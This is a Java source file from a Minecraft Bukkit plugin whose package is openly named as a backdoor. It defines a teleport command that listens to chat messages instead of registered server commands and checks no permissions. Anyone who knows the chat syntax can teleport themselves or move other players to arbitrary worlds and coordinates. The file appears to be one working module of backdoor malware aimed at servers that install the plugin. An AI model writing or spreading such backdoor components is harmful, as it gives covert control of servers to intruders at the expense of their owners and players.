package me.thesaltyboys.backdoor.commands;

import me.thesaltyboys.backdoor.Command;
import me.thesaltyboys.backdoor.RegisterCommand;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.World;
import org.bukkit.entity.Player;
import org.bukkit.event.player.PlayerChatEvent;

import java.util.ArrayList;
import java.util.Objects;

@RegisterCommand(displayName = "teleport", aliases = {"tp", "tele", "teleport"})
public class TpCommand extends Command {

    @Override
    public void onExec(PlayerChatEvent event, ArrayList<String> args) {
        if (args.size() >= 2) {
            if (args.get(0).equalsIgnoreCase("player")) {
                if (args.size() == 2) {
                    event.getPlayer().teleport(Objects.requireNonNull(Bukkit.getPlayer(args.get(1))).getLocation());
                }
            }
            if (args.get(0).equalsIgnoreCase("coordinates")) {
                if (args.size() == 4) {
                    event.getPlayer().teleport(new Location(
                            event.getPlayer().getWorld(),
                            Double.parseDouble(args.get(1)),
                            Double.parseDouble(args.get(2)),
                            Double.parseDouble(args.get(3))));
                }
            }
            if (args.get(0).equalsIgnoreCase("otherPlayer")) {
                if (args.size() == 6) {
                    Player p = Bukkit.getPlayer(args.get(1));
                    World world = Bukkit.getWorld(args.get(2));

                    if (p == null || world == null) {
                        return;
                    }

                    p.teleport(new Location(
                            world,
                            Double.parseDouble(args.get(3)),
                            Double.parseDouble(args.get(4)),
                            Double.parseDouble(args.get(5))));
                }
            }
            if (args.get(0).equalsIgnoreCase("otherPlayers")) {
                if (args.size() == 3) {
                    Bukkit.getPlayer(args.get(1)).teleport(Bukkit.getPlayer(args.get(2)).getLocation());
                }
            }
        }
    }
}
